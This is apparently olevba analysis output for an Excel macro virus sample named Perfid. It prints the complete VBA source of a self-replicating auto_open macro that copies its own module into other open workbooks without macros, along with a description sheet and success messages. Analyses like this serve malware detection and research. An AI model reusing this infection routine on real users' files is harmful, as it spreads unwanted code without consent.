olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Perfid-28d79a63c9cc19db599e26c97b37e201aa12c5fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Tstvr.bas 
in file: Virus.MSExcel.Perfid-28d79a63c9cc19db599e26c97b37e201aa12c5fc - OLE stream: '_VBA_PROJECT_CUR/VBA/Tstvr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
' Test virus version 1.0
' Infects MS-Excel files
' When opened, searches for a victim among currently
' open workbooks
' This version adds an extra sheet to infected workbook telling
' the owner how to remove the virus
' Besides, it displays a message telling whether infection was
' successfull or not
'
Const VirModulName = "Tstvr"
Const DescrSheetName = "Tstvr_Descr"
Dim ActiveName As String  ' Name of the infector file
Dim VictimName As String  ' Name of the victim
Dim InfectSuccess As Boolean ' Indicates that
Dim TestDupNames As Boolean
Dim i As Integer, j As Integer
Dim DummyMsg As Integer
' Initialisation
'
  Application.ScreenUpdating = False
  ActiveName = ActiveWorkbook.Name
  InfectSuccess = False
' Searching for a potential victim
'
  For i = 1 To Workbooks.Count
    If Workbooks(i).Name <> ActiveName Then
' This one could be a victim...
'
      VictimName = Workbooks(i).Name
' Activating victim...
'
      Workbooks(i).Activate
      If Modules.Count = 0 Then
' An infection attempt only will be made when the victim has no macros
'
        On Error Resume Next
        TestDupNames = False
        For j = 1 To Sheets.Count
         If Sheets(j).Name = DescrSheetName Or Sheets(j).Name = VirModulName Then
            TestDupNames = True
            Exit For
         End If
       Next j
       If Not (TestDupNames) Then
         Sheets.Add
         ActiveSheet.Name = DescrSheetName
         If Err = 0 Then
' Description sheet added successfully
'
' Now, adding the description of the virus
' and instructions for removing
'
           Cells(1, 1).Value = "This file was infected by test virus v. 1.0"
             If Err = 0 Then
               Cells(2, 1).Value = "To remove virus, simply close this file without saving it"

             If Err = 0 Then
               Cells(3, 1).Value = "or delete the macro module named " + VirModulName + " and this decsription sheet"
        

' Copying the virus itself
'
                Workbooks(ActiveName).Activate
                Sheets(VirModulName).Copy Before:=Workbooks(VictimName).Sheets(1)
                InfectSuccess = True
                Exit For
            End If
            End If
          End If
        End If
      End If
    End If
  Next i
' Testing if infection was successfull
'
  If InfectSuccess Then
    DummyMsg = MsgBox("Successfully infected workbook " & VictimName, , "Test Virus reports...")
    Workbooks(VictimName).Sheets(DescrSheetName).Activate
  Else
    DummyMsg = MsgBox("Couldn't infect any workbook ", , "Test Virus reports...")
  End If
  Application.ScreenUpdating = True
End Sub 'of test_vir
    

  
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Tstv
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tstvr_Desc
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|open                |May open a file                              |
+----------+--------------------+---------------------------------------------+

